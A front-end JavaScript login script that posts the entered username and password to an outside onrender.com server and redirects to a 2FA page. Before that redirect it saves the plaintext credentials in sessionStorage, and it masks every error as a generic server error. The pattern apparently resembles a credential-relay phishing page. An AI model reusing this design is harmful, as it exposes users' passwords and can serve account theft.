document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.login-form');
    const loginButton = document.getElementById('login-button');
    const buttonText = document.getElementById('button-text');
    const loadingGif = document.getElementById('loading-gif');
    const errorElement = document.getElementById('error-message');
    
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.getElementById('login-username').value.trim();
        const password = document.getElementById('login-password').value.trim();
        
        if (!username || !password) {
            showError('Please enter both username and password');
            return;
        }
        
        if (password.length < 6) {
            showError('Password must be at least 6 characters');
            return;
        }
        
        // Show loading state
        buttonText.style.display = 'none';
        loadingGif.style.display = 'inline-block';
        loginButton.disabled = true;
        errorElement.style.display = 'none';
        
        fetch('https://base-server-mksp.onrender.com/process_login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password
            })
        })
        .then(response => {
            if (!response.ok) {
                // Все ошибки HTTP преобразуем в общее сообщение
                throw new Error('Server error. Please try again later');
            }
            return response.json();
        })
        .then(data => {
            if (data.status === 'success') {
                window.location.href = '/website/verifed/index.html';
            } 
            else if (data.status === '2fa_required') {
                sessionStorage.setItem('loginData', JSON.stringify({
                    username: username,
                    password: password
                }));
                window.location.href = '/website/2fa/index.html';
            }
            else {
                // Все ошибки от сервера преобразуем в общее сообщение
                showError('Server error. Please try again later');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            showError('Server error. Please try again later');
        })
        .finally(() => {
            // Restore button
            buttonText.style.display = 'inline-block';
            loadingGif.style.display = 'none';
            loginButton.disabled = false;
        });
    });
    
    function showError(message) {
        errorElement.textContent = message;
        errorElement.style.display = 'block';
        errorElement.style.animation = 'none';
        setTimeout(() => {
            errorElement.style.animation = 'shake 0.5s';
        }, 10);
    }
});


